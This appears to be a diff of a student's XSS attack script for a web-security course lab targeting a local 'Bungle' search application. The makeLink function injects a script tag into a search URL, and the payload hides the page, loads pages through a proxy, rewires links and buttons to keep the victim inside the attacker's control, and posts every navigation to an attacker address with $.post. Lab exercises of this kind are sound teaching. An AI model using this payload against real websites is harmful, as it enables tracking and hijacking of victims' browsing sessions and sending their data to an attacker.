@@ -4,22 +4,29 @@
 
 // Extend this function:
 function payload(attacker) {
-    window.history.pushState({page: 1}, "page 1", "./")
-    document.getElementById("bungle-lnk").href = "./".concat(url.substring("http://127.0.0.1/project2/".length));
-    console.log(document.getElementById("bungle-lnk").href);
-    // document.getElementById("bungle-lnk").onclick = function () {
-    //     console.log("boop");
-    //     location.href = url;
-    // }
+    //document.getElementById("bungle-lnk").href = "./".concat(url.substring("http://127.0.0.1/project2/".length));
     function log(data) {
         console.log($.param(data))
         $.post(attacker, data);
     }
     function proxy(href) {
         $("html").load(href, function(){
+            window.history.pushState({page: 1}, "page 1", href);
             $("html").show();
             log({event: "nav", uri: href});
-            $("#query").val("pwned!");
+            //console.log("./search?q=" + $("form[action='#./search']").val());
+            $("#bungle-lnk").attr("href", "./" + url);
+            if(href == "./") {
+                $("#search-btn").attr("type", "button");
+                $("#search-btn").click(function() {
+                    proxy("./search?q=" + $("#query").val());
+                });
+            }
+            else {
+                $("a:contains('<script>')").remove();
+                $("#search-again-btn").attr("href", "./" + url);
+            }
+            
         });
     }
     $("html").hide();
@@ -29,7 +36,7 @@ function payload(attacker) {
 function makeLink(xssdefense, target, attacker) {
     if (xssdefense == 0) {
         return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" + 
-        encodeURIComponent("<script" + ">" + "var url = window.location.href; " + payload.toString() + ";payload(\"" + 
+        encodeURIComponent("<script" + ">" + "var url = window.location.href.substring(\"http://127.0.0.1/project2/\".length); " + payload.toString() + ";payload(\"" + 
         attacker + "\");" + "<" + "/script" + ">");
     } else {
         // Implement code to defeat XSS defenses here.
